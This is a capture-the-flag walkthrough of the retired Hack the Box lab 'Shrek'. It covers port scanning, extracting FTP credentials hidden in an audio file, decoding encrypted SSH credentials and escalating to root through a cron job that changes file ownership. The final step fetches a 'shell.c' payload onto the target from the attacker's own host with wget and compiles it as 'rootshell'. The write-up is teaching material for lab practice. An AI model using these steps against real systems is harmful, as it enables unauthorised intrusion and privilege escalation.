<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Shrek Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-shrek-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-04-06T17:20:31+00:00">April 6, 2018</time><time class="updated" datetime="2025-07-05T19:00:17+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends!! Today we are going to solve another CTF challenge “<strong>Shrek</strong>” which is available online for those who want to increase their skill in penetration testing and black box testing. Shrek is retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level; they have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> find <strong>user.txt</strong> and <strong>root.txt</strong> file on victim’s machine.</span></p>
<h3><span style="color: #800000;">Initial Reconnaissance and Web Enumeration</span></h3>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.47</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="lang:default decode:true">nmap -sV 10.10.10.47</pre>
<p><span style="color: #000000;">From given below image, you can observe we found port 21,22 and 80 are open in victim’s network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-yUngUWFiFdc/WsegH-HX2ZI/AAAAAAAAWIg/3e9grbva_iMPQoWuA0_68V_Y3EUyCbUCQCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As we know from the nmap scan that the target machine is running HTTP on port 80, we open the Ip in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YOxxkpjg_dU/WsegMQzRz9I/AAAAAAAAWIc/QH-5bw97O5Ux80opAo7mgQxZU50uU4xAACEwYBhgL/s1600/3.png"/></span></p>
<h3><span style="color: #800000;">Discovering Hidden Files and Audio Analysis</span></h3>
<p><span style="color: #000000;">We don’t find anything on the home page, so we use dirb to enumerate the directories.</span></p>
<pre class="lang:default decode:true">dirb http://10.10.10.47</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sQ8N1gkCdbw/WsegKa5UHlI/AAAAAAAAWIk/RViT5ewAiOcMNhIWMZQTNl7YpyjqbCF5gCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">dirb scan shows a directory called uploads. We open uploads/ directory and find a file called secret_ultimate.php.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wu734bnoG6o/WsegMSxeOSI/AAAAAAAAWIc/kb_EMfpN7b45iJD8qzlhoBFoJIlw952HgCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">Now we use wget to download the file into our system.</span></p>
<pre class="lang:default decode:true">wget http://10.10.10.47/uploads/secret_ultimate.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-QxuQ0zJXVmE/WsegMvFG-dI/AAAAAAAAWIg/jK9qVAVfz_YfgjlbMcUXNiCBZE7SAAvcgCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We open secret_ultimate.php and find a path to a directory called secret_area_51.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-utARto5FepI/WsegNH2XT5I/AAAAAAAAWIw/Q7-QiT4pf1o0Tk869AGY-2I10IlpbDLPQCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">We open it in our browser and find an audio file in that directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vAfEbkfVqGg/WsegNfU3y3I/AAAAAAAAWIk/h_n1BObf3CgmIzDLfw5eFA6AX1Rx_AelACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now, we download into our system and use an online site called academo.org to analyse the spectrum, we find a hint to log in through FTP using username donkey.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-RLa9xTEB4eI/WsegNlIhuiI/AAAAAAAAWIw/Rs4FGWhF5-ch33GBbGzyAWJq5x3UbLMgQCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Further analysis of the audio file gives us the password to the username.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5xbRzDpcTus/WsegNr-bTUI/AAAAAAAAWIs/B6qXIY1aCiIV_wPmx0QzWjvNA_kdA3fLwCEwYBhgL/s1600/9.png"/></span></p>
<h3><span style="color: #800000;">FTP Access and Credential Extraction</span></h3>
<p><span style="color: #000000;">We login through FTP using the credentials we find in the audio file. After logging in we find a few text files and a file simply called key.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-Qa-CQAsLTKw/WsegHzID4II/AAAAAAAAWIw/i-shvYqF9kUDoFP5kGQlnd3X2cp-lCyKQCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We download the key and all the test files we use mget to mass-download the txt files.</span></p>
<pre class="lang:default decode:true">ftp&gt; get key
ftp&gt; mget *.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-a7ZFU6f2iO4/WsegH_CWYCI/AAAAAAAAWIc/t3cD_FFF9hUSP6BaNGvMzXc59XUYiIydgCEwYBhgL/s1600/11.png"/></span></p>
<p><span style="color: #000000;">On our system as we can see all the files have been downloaded.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hXs4RvM_3cY/WsegIlIFUdI/AAAAAAAAWIk/XF4JuBC_rbYoaby_FnL2XAVz78Rlxr9gACEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Then, we open the files one by one and in the highlighted file above we found a base64 encoded string that was differentiated by space.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ZSGPc7F6bHc/WsegI7yrObI/AAAAAAAAWIw/qAfTKKuBj9cuOHw9H6hQep89L9PC1J_dQCEwYBhgL/s1600/13.png"/></span></p>
<p><span style="color: #000000;">We decode the first base64 encoded string using <b>hack bar</b> and find the decoded string to be ‘PrinceCharming’</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-SgX-Lsua2EY/WsegI3_FW_I/AAAAAAAAWIY/sQqOweQdZdc__TKCg5rU0AAaveWj78xbgCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">In another file, we find a base64 encoded string similarly differentiated by space.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-St5fNoBxJ_k/WsegJHq_yvI/AAAAAAAAWIk/2mfEvtqmh3wOgdqBbGGYKZFLjIg5fLmmACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We decode the base64 encoded string and find a hexadecimal encoded string.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Yt0TBBJbr38/WsegJYjY2yI/AAAAAAAAWIY/hL2drbvSRjkTRgmU4_JwwXntTAICovuFgCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">We use python to decode the hexadecimal string. Then, we use seccure module and use ‘PrinceCharming’ as key to decode the string and find the ssh username and passphrase for the key</span></p>
<pre class="lang:default decode:true">import seccure
string ="hexadecimal string"
print seccure.decrypt(string, "PrinceCharming")</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eZVRQWtsAQk/WsegJmEVICI/AAAAAAAAWIk/x38kd5n5GCk14vw0JUb94EDsOmEtsdC-wCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We open the key file and find that is a rsa key for ssh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-x-_32j32BpY/WsegJ4F0cJI/AAAAAAAAWIw/G-Ansc9JyAwbvaub6LGnk1WajO9Bxcp6gCEwYBhgL/s1600/18.png"/></span></p>
<p><span style="color: #000000;">We use this key to log in through using this rsa key. Then, we use the username as sec as we found earlier and use the passphrase we found before to log in. As we log in we go to /home/sec directory, in that directory we find a file called user.txt. When we open the file we get our first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Elot4vkz2Y0/WsegKZDyg1I/AAAAAAAAWIk/YbaXYB33WXkcJ1udyXud-dwwjqpM0CloACEwYBhgL/s1600/19.png"/></span></p>
<h3><span style="color: #800000;">Privilege Escalation Through File Monitoring</span></h3>
<p><span style="color: #000000;">Going through the directories we find a file called thoughts.txt</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qwzbsCEHKvU/WsegKzHfAkI/AAAAAAAAWIk/yMoarYx59UwFtRIDdnKB0Z8NLnTFSIWkgCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">We create a file called raj in this directory.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-lZAAMAyqjJ8/WsegK0f9aYI/AAAAAAAAWIo/9ccLwif8mp02qSqViU9hd5NA99Dzhnk4wCEwYBhgL/s1600/21.png"/></p>
<p><span style="color: #000000;">After a few minutes, we find that it changed to user and group of the file changed to root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-10Eh8H94QEw/WsegLGnFLlI/AAAAAAAAWIw/BmtM7gxelt8NCS-VkGXwBCKIbdvbO4QIgCEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Now to exploit the file we create a c program in our system that can give us the root.txt file in root directory. After creating the file we use SimpleHTTPServer module of python to transfer the file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-SVBB5cbb43Q/WsegLV-Yt8I/AAAAAAAAWIY/0GW-Pz2h7xA_iHhjyJ6oU4m4fg6mXpp4ACEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Then, we now download the file into the target system using wget.</span></p>
<pre class="lang:default decode:true">wget http://10.10.14.6:8000/shell.c</pre>
<p><span style="color: #000000;">After downloading the file we compile the c program and save the compiled executable as rootshell.</span></p>
<pre class="lang:default decode:true ">gcc shell.c -o rootshell</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uCB9w1YX4EQ/WsegL5z5hnI/AAAAAAAAWIg/MoV4UjU2HSI2vT43COLkZcF0XK0vmqYWQCEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">We now wait for the system to change the user and group of the file. As soon as it changes the user and group of the file we run it and find the final flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VUzJ9iGwCqo/WsegL9nFP5I/AAAAAAAAWIY/znprpz8yfMwQ2sKrlivUzq-1HBtSYVHwwCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"> <strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
